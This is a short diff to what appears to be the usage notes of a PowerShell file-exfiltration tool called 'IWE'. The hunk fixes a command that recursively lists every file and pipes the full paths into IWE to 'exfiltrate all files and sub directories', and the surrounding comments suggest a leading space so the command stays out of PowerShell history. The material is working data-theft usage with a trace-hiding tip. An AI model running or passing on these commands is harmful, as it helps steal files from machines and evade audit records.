@@ -237,7 +237,8 @@ ls | IWE -Insecure
 ls file* | IWE
 
 # Exfiltrate all files and sub directories 
-ls -Recurse * | IWE
+# 'ls * -Recurse' does not work as it doesn't return the full path of the files
+ls * -Recurse | Select-Object -ExpandProperty FullName | IWE
 
 # Define exfiltration password via parameter (not so secure but okay)
 # Add space before command to prevent it from being save in the PowerShell histroy
